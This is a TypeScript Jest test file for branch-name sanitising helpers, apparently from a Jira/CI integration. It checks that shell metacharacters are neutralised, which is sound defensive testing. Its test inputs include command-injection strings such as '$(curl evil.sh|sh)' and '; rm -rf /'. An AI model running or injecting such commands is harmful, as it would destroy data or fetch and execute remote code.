import { slugify, buildBranchName, sanitizeBranch } from '../jira/branchName';
import { CIProviderError } from '../interfaces/CIProviderError';

describe('slugify', () => {
  it('lowercases and replaces runs of non-alphanumerics with a single hyphen', () => {
    expect(slugify('Fix the Login Bug')).toBe('fix-the-login-bug');
    expect(slugify('Hello,   World!!')).toBe('hello-world');
  });

  it('strips diacritics so the result is plain ASCII', () => {
    expect(slugify('Café déjà vu')).toBe('cafe-deja-vu');
  });

  it('trims leading and trailing hyphens', () => {
    expect(slugify('  ---weird---  ')).toBe('weird');
  });

  it('removes shell metacharacters entirely (injection defence)', () => {
    // A summary crafted to break out of a shell command must collapse to a
    // harmless slug containing no shell-significant characters.
    expect(slugify('; rm -rf * ;')).toBe('rm-rf');
    expect(slugify('$(curl evil.sh|sh)')).toBe('curl-evil-sh-sh');
  });

  it('returns an empty string when there are no alphanumerics', () => {
    expect(slugify('@#$%^&*')).toBe('');
  });
});

describe('buildBranchName', () => {
  it('combines a sanitised issue key with the slugified summary', () => {
    expect(buildBranchName('PROJ-123', 'Fix the login bug')).toBe(
      'PROJ-123-fix-the-login-bug',
    );
  });

  it('preserves the upper-case issue key', () => {
    expect(buildBranchName('ABC-9', 'Add Feature')).toBe('ABC-9-add-feature');
  });

  it('falls back to just the issue key when the summary has no usable characters', () => {
    expect(buildBranchName('PROJ-1', '!!!')).toBe('PROJ-1');
  });

  it('produces a branch name that is safe to splice into a URL/ref', () => {
    const branch = buildBranchName('SEC-1', '; rm -rf /; echo pwned');
    // No whitespace, no shell metacharacters.
    expect(branch).toMatch(/^[A-Za-z0-9][A-Za-z0-9._/-]*$/);
    expect(branch).not.toMatch(/[;*$&?#\s]/);
  });

  it('truncates very long summaries to keep the ref length bounded', () => {
    const longSummary = 'word '.repeat(100);
    const branch = buildBranchName('PROJ-1', longSummary);
    expect(branch.length).toBeLessThanOrEqual(80);
    expect(branch.startsWith('PROJ-1-')).toBe(true);
  });

  it('throws when the issue key contains no usable characters', () => {
    expect(() => buildBranchName('***', 'summary')).toThrow(CIProviderError);
  });
});

describe('sanitizeBranch', () => {
  it('preserves a valid branch name verbatim, including case and slashes', () => {
    expect(sanitizeBranch('feature/PROJ-7-login')).toBe('feature/PROJ-7-login');
  });

  it('collapses unsafe character runs into a single hyphen', () => {
    expect(sanitizeBranch('PROJ-7 fix the login!!')).toBe('PROJ-7-fix-the-login');
  });

  it('neutralises shell metacharacters in an edited branch', () => {
    const branch = sanitizeBranch('PROJ-7; rm -rf /');
    expect(branch).toMatch(/^[A-Za-z0-9][A-Za-z0-9._/-]*$/);
    expect(branch).not.toMatch(/[;*$&?#\s]/);
  });

  it('throws when nothing usable remains', () => {
    expect(() => sanitizeBranch('!!! @@@')).toThrow();
  });
});
